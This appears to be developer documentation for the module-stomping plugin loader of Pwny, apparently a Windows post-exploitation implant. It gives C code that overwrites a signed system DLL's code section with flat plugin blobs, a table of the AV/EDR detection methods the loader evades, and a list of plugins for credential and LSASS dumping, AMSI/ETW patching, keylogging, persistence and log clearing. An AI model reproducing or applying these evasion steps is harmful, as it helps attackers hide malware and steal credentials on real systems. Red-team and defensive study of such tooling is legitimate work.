# Code-Only Tabs (COT)

COT is Pwny's stealth plugin loading mechanism for Windows. It replaces the traditional DLL-drop-and-LoadLibrary approach with **module stomping** of flat code blobs, eliminating virtually every artifact that AV/EDR engines use to detect dynamically loaded code.

---

## Why COT?

The legacy plugin path triggers multiple detection vectors:

| Detection Vector | Legacy DLL Path | COT Path |
|-----------------|----------------|----------|
| File on disk | Temp DLL in `%TEMP%` | **None** |
| PE headers in memory | Full MZ/PE at base address | **None** |
| Unsigned module in VAD tree | Yes (temp DLL) | **No** — backed by signed system DLL |
| Import Address Table | Present (Win32 imports) | **None** — vtable only |
| Hooked API calls | All go through IAT | **Indirect** — resolved at init |
| `CreateFile` / `WriteFile` | Yes (temp file creation) | **None** |

COT eliminates **all five** of the classic DLL-drop signals: file creation, unsigned module, PE headers, import table, and suspicious create-load-delete pattern.

---

## Architecture

### Phase 1: Build-Time (`pe2cot.py`)

Plugins are first compiled as standard DLLs using the same toolchain and compiler flags. A post-build step (`scripts/pe2cot.py`) strips the DLL into a raw code blob:

```
┌─────────────────────────────┐
│  Compiled Plugin DLL        │
│  ┌───────┐ ┌──────┐        │
│  │.text  │ │.rdata│ ...    │
│  └───────┘ └──────┘        │
│  Exports: TabInitCOT        │
│  .reloc section             │
└─────────────────────────────┘
              │
              ▼  pe2cot.py
┌─────────────────────────────┐
│  .cot file (v2)             │
│  ┌──────────────────┐       │
│  │ cot_header_t     │ 40 B  │
│  │  magic: "COT\0"  │       │
│  │  version: 2      │       │
│  │  entry_offset    │       │
│  │  code_size       │       │
│  │  rw_offset       │       │
│  │  rw_size         │       │
│  │  original_base   │       │
│  │  reloc_count     │       │
│  ├──────────────────┤       │
│  │ flat code blob   │       │
│  │ (.text+.rdata+   │       │
│  │  .data+.bss+...) │       │
│  ├──────────────────┤       │
│  │ reloc table      │       │
│  │ (reloc_count *   │       │
│  │  4 B offsets)    │       │
│  └──────────────────┘       │
└─────────────────────────────┘
```

**What pe2cot.py does:**

1. Parses PE headers to enumerate sections
2. Parses the `.reloc` section to extract `IMAGE_REL_BASED_DIR64` fixup entries
3. Lays out remaining sections (excluding `.reloc`) in virtual order into a contiguous byte array
4. Locates the `TabInitCOT` export and records its offset relative to blob start
5. Identifies writable sections (`.data`, `.bss`) by checking `IMAGE_SCN_MEM_WRITE`
6. Filters relocations to only those within the blob range, records as blob-relative offsets
7. Writes the 40-byte v2 `cot_header_t` + flat blob + relocation fixup table

**Result:** No MZ signature, no PE headers, no section table, no import directory, no export directory — just raw machine code, data, and a compact relocation table.

### Phase 2: Transport

The `.cot` blob is stored in `pwny/tabs/<platform>/<arch>/` alongside legacy DLL plugins. The Python session loader (`pwny/plugins.py`) reads the file and sends it to the implant via `BUILTIN_ADD_TAB_BUFFER` — the same TLV channel used for DLLs. No protocol changes needed.

### Phase 3: Runtime — Module Stomping (`tabs_add_cot`)

When `tabs_add()` receives a buffer, it checks the magic bytes:

```c
if (cot_is_cot_image(image, length))
    return tabs_add_cot(tabs, id, image, length, c2);
```

If the magic is `0x00544F43` ("COT\0"), the COT loader takes over:

#### Step 1 — Load a Sacrificial Signed DLL

```c
static const char *stomp_candidates[] = {
    "dbgcore.dll",
    "dbghelp.dll",
    "wldp.dll",
    "srpapi.dll",
    NULL
};

hStomp = LoadLibraryA(stomp_candidates[i]);
```

Each candidate is a **Microsoft-signed** system DLL that ships with every Windows installation. The loader picks one whose `SizeOfImage` is large enough for the COT blob.

**Why these DLLs:**
- `dbgcore.dll` / `dbghelp.dll` — Debug support, large image (~600 KB+), rarely resident
- `wldp.dll` — Windows Lockdown Policy, moderate size
- `srpapi.dll` — Software Restriction Policies, moderate size

All are legitimately loadable. Their presence doesn't raise suspicion.

The Python-side plugin loader (`plugins.py`) maintains a **stomp candidate pool** of 30+ Microsoft-signed DLLs. When probing the target, it queries each candidate's `SizeOfImage` via `BUILTIN_PROBE_STOMP` and assigns the best-fit DLL for each plugin load.

#### Step 2 — VirtualProtect to RW

```c
stomp_text = (BYTE *)hStomp + 0x1000;
VirtualProtect(stomp_text, code_size, PAGE_READWRITE, &dwOld);
```

The PE header page at offset `0x0` is left untouched — the module's headers remain valid from the OS perspective.

#### Step 3 — Overwrite (Stomp)

```c
memcpy(stomp_text, code, code_size);
```

A plain `memcpy` into the process's own memory. No `WriteProcessMemory`, no `NtWriteVirtualMemory`, no cross-process handle — the least suspicious write primitive possible.

#### Step 3.5 — Apply Base Relocations (v2)

The COT blob was linked at a specific `original_base` address, but gets stomped into a different runtime address. Any absolute pointers (function pointer tables, static pointer arrays, CRT init tables) must be adjusted:

```c
if (hdr->reloc_count > 0) {
    uint32_t *relocs = (uint32_t *)(code + code_size);
    int64_t delta = (int64_t)((uintptr_t)stomp_text - hdr->original_base);

    for (DWORD i = 0; i < hdr->reloc_count; i++) {
        *(uint64_t *)((BYTE *)stomp_text + relocs[i]) += delta;
    }
}
```

Each entry in the relocation table is a blob-relative offset of a 64-bit value (`DIR64`) to adjust by `delta = runtime_base - original_base`. This runs **after** the memcpy and **before** setting page protections to RX, so the writes land in still-writable pages.

This eliminates the need for plugins to avoid static pointer tables or wrap code in optimization pragmas — the loader handles it transparently.

#### Step 4 — Set Final Page Protections

```c
// Code/rodata → RX
VirtualProtect(stomp_text, hdr->rw_offset, PAGE_EXECUTE_READ, &dwOld);

// Writable region (.data/.bss) → RW
VirtualProtect(stomp_text + hdr->rw_offset, hdr->rw_size, PAGE_READWRITE, &dwOld);
```

Strict **W^X discipline** — no page ever has simultaneous Write + Execute. This avoids `PAGE_EXECUTE_READWRITE` heuristics that many EDRs flag.

#### Step 5 — Flush and Execute

```c
FlushInstructionCache(GetCurrentProcess(), stomp_text, code_size);

entry = (cot_init_t)((BYTE *)stomp_text + hdr->entry_offset);
entry(vt, &tab_new->api_calls, &c2->pipes);
```

Execution begins via a **direct function pointer call** — no `CreateThread`, no APC injection, no callback-based execution. The code runs as a normal function call from the main event loop.

### Phase 4: Plugin-Side Vtable

COT plugins have **zero imports**. Every external function is accessed through a vtable (`tab_vtable_t`) passed at initialization:

```c
typedef struct {
    /* Registration */
    void (*api_call_register)(...);
    void (*api_pipe_register)(...);
    /* TLV lifecycle */
    tlv_pkt_t *(*api_craft_tlv_pkt)(...);
    tlv_pkt_t *(*tlv_pkt_create)(void);
    void       (*tlv_pkt_destroy)(...);
    /* TLV add */
    int (*tlv_pkt_add_u32)(...);
    int (*tlv_pkt_add_string)(...);
    int (*tlv_pkt_add_bytes)(...);
    int (*tlv_pkt_add_tlv)(...);
    /* TLV get */
    int (*tlv_pkt_get_u32)(...);
    int (*tlv_pkt_get_string)(...);
    int (*tlv_pkt_get_bytes)(...);
    /* Logging */
    void (*log_debug)(...);
    /* Generic resolver */
    void *(*resolve)(const char *module, const char *func);
    /* CRT heap */
    void *(*crt_malloc)(size_t size);
    void  (*crt_free)(void *ptr);
    void *(*crt_calloc)(size_t nmemb, size_t size);
    /* C2 enqueue */
    int (*c2_enqueue_tlv)(c2_t *c2, tlv_pkt_t *pkt);
    /* Stomped module handle */
    void *hModule;
    void *_reserved[3];
} tab_vtable_t;
```

**17 Pwny API functions**, CRT heap wrappers, a C2 enqueue function, a generic `resolve()` for Win32 APIs, and the stomped module handle. The vtable is:
- Heap-allocated by the host
- Populated from the host's own statically-linked symbols
- The `resolve` field wraps `GetModuleHandleA → LoadLibraryA → GetProcAddress`

Transparent macros redirect standard API names through the vtable:

```c
#define api_craft_tlv_pkt(s, r) _cot_vt->api_craft_tlv_pkt(s, r)
#define tlv_pkt_create()        _cot_vt->tlv_pkt_create()
```

This means plugin source code reads identically to the DLL version — only the header inclusion changes.

### Phase 5: Cleanup

When a COT tab is unloaded:

1. **Zero the stomped pages** — `VirtualProtect(RW)` → `SecureZeroMemory` → `VirtualProtect(RX)` — erases code so forensics find only zeroes
2. **Free the vtable** — `free(tab->cot_vtable)`
3. **Unload the sacrifice** — `FreeLibrary(tab->hStomp)`

---

## Stealth Analysis

| Detection Vector | COT Exposure | Notes |
|-----------------|:-----------:|-------|
| File-drop scanning | Clean | No file touches disk |
| PE header scanning | Clean | No MZ/PE in stomped region |
| Unsigned module in VAD | Clean | VAD points to signed DLL |
| IAT/EAT hooking detection | Clean | No import table — vtable on heap |
| RWX page detection | Clean | Strict W^X: never simultaneous |
| `WriteProcessMemory` hooks | Clean | Uses `memcpy` (same-process) |
| Thread creation monitoring | Clean | No new threads |
| `VirtualAlloc(RWX)` hooks | Clean | Never called |
| Module load callbacks | Neutral | `LoadLibraryA` fires for signed DLL |
| ETW / kernel callbacks | Low risk | `LdrDllNotification` sees signed DLL |
| Stack-based heuristics | Low risk | IP inside VAD range of signed DLL |
| Memory scanning (YARA) | Depends | No PE signatures, but custom rules may match code patterns |

### Remaining Risks

1. **`VirtualProtect` on signed module pages** — Advanced EDRs (CrowdStrike, SentinelOne) may monitor protection changes on signed images
2. **Content mismatch** — Comparing on-disk `.text` with in-memory reveals tampering (module integrity checking)
3. **Sacrifice DLL choice** — Loading `dbgcore.dll` in a process that never uses debug APIs could be anomalous
4. **`FlushInstructionCache`** — Combined with `VirtualProtect` on signed pages, may form a behavioral sequence

---

## Binary Format Reference

### `cot_header_t` (40 bytes, little-endian, packed)

| Offset | Size | Field | Description |
|--------|------|-------|-------------|
| 0x00 | 4 | `magic` | `0x00544F43` ("COT\0") |
| 0x04 | 4 | `version` | `2` |
| 0x08 | 4 | `entry_offset` | Offset of `TabInitCOT` from blob start |
| 0x0C | 4 | `code_size` | Total size of flat code blob |
| 0x10 | 4 | `rw_offset` | Offset of writable region (0 = none) |
| 0x14 | 4 | `rw_size` | Size of writable region (0 = none) |
| 0x18 | 8 | `original_base` | Link-time base address (`ImageBase + base_va`) |
| 0x20 | 4 | `reloc_count` | Number of DIR64 fixup entries after blob |
| 0x24 | 4 | `_pad` | Alignment padding (0) |

After the `code_size` bytes of flat code blob, the file contains `reloc_count` × 4 bytes of `uint32_t` blob-relative offsets. Each offset points to a 64-bit value that the loader adjusts by `runtime_base − original_base`.

### Memory Layout After Stomp

```
Sacrifice DLL base (hStomp)
├── 0x0000  PE header (untouched, valid signed headers)
├── 0x1000  COT .text + .rdata      [PAGE_EXECUTE_READ]  ← relocations applied
├── ...     COT .data + .bss        [PAGE_READWRITE]     ← relocations applied
├── ...     COT trailing sections   [PAGE_EXECUTE_READ]
└── ...     Remaining sacrifice pages (untouched)

COT blob on wire / in memory (before stomp):
├── [0x00]              cot_header_t (40 bytes)
├── [0x28]              flat code blob (code_size bytes)
└── [0x28 + code_size]  reloc table (reloc_count × 4 bytes)
```

---

## Inspecting COT Blobs — `cotinfo.py`

`scripts/cotinfo.py` parses COT files and prints header fields, memory layout, entropy, and hex dumps.

### Usage

```bash
# Single file
python3 scripts/cotinfo.py pwny/tabs/windows/x64/forge

# Scan a directory
python3 scripts/cotinfo.py -d pwny/tabs/windows/x64/

# Include hex dump
python3 scripts/cotinfo.py --hex pwny/tabs/windows/x64/forge
```

### Sample Output

```
$ python3 scripts/cotinfo.py pwny/tabs/windows/x64/forge
[*] File:          pwny/tabs/windows/x64/forge
[*] Plugin:        forge
[*] File size:     37012 bytes (36.1 KB)
[*] Magic:         0x00544F43 ("COT\0")
[*] Version:       2
[*] Code size:     36880 bytes (36.0 KB)
[*] Entry offset:  0xD80 (stomp VA: 0x1D80)
[*] RW region:     offset 0x2000, size 28688 bytes (28.0 KB)
[*] RX region:     offset 0x0, size 8192 bytes (8.0 KB)
[*] Entropy:       1.95 / 8.00
[*] Header:        40 bytes (v2)
[*] Original base: 0x0000000387A31000
[*] Relocations:   23 DIR64 fixups
[*] Memory layout after stomp:
     hStomp + 0x0000  PE header (sacrifice, untouched)
     hStomp + 0x1000  .text + .rdata  [RX]  (8192 bytes)
     hStomp + 0x3000  .data + .bss    [RW]  (28688 bytes)
```

### Fields Explained

| Field | Meaning |
|-------|---------|
| **Entry offset** | Offset of `TabInitCOT` within the code blob. **Stomp VA** adds `0x1000` for the PE header page. |
| **RW region** | Writable `.data` / `.bss` span — gets `PAGE_READWRITE` |
| **RX region** | Read-execute `.text` + `.rdata` span — gets `PAGE_EXECUTE_READ` |
| **Entropy** | Shannon entropy (0.0–8.0). Low = sparse blobs (mostly zero `.bss`) |
| **Original base** | (v2) Link-time base address used to compute relocation delta |
| **Relocations** | (v2) Number of DIR64 fixup entries. Use `--hex` to list individual offsets |

---

## COT Plugins List

All 28 Windows plugins are built as COT:

| Plugin | Description |
|--------|-------------|
| `arp` | ARP table enumeration |
| `clipboard` | Clipboard get/set |
| `credentials` | SAM hashdump, LSA secrets, DPAPI |
| `lsadump` | Stealthy LSASS memory dump via indirect syscalls |
| `credstore` | Windows Credential Manager |
| `evasion` | AMSI/ETW patching, DLL unhooking |
| `eventlog` | Event log listing/clearing |
| `execute` | PowerShell, .NET assembly, BOF execution |
| `forge` | Arbitrary Win32 API calls |
| `getsystem` | SYSTEM elevation |
| `inject` | Process injection, migration, PPID spoofing |
| `kerberos` | Kerberos ticket listing/dumping/purging |
| `media` | Camera and microphone capture |
| `minidump` | Process memory dump (lsass, etc.) |
| `netshare` | SMB share/session enumeration |
| `persist` | Persistence mechanisms |
| `registry` | Registry read/write/delete |
| `schtasks` | Scheduled tasks management |
| `services` | Service enumeration with AV/EDR detection |
| `smb_pipe` | Named pipe communication |
| `sysinfo` | Installed apps and hotfixes |
| `timestomp` | File timestamp manipulation |
| `token` | Token impersonation |
| `uac` | UAC status and integrity level |
| `ui` | Screenshots, streaming, input control, keylogging |
| `sniffer` | Raw-socket packet capture (SIO_RCVALL) |
| `wifi_passwords` | WiFi profile/password extraction |

---

## File Inventory

| File | Role |
|------|------|
| `include/mingw/pwny/tab_cot.h` | COT binary format, vtable struct, plugin-side macros |
| `include/pwny/tabs.h` | `tabs_t` struct with COT fields |
| `src/tabs.c` | COT loader, vtable builder, auto-detection, cleanup |
| `scripts/pe2cot.py` | Post-build PE→COT extractor |
| `scripts/cotinfo.py` | COT blob inspector |
| `CMakeLists.txt` | Build system with `COT_PLUGINS` list |

---

## See Also

- [Plugin Development](plugin-development.md) — how to write and port plugins to COT
- [Windows Plugins](windows/README.md) — complete documentation for all Windows plugins
- [Building](building.md) — how to compile Pwny from source with COT support
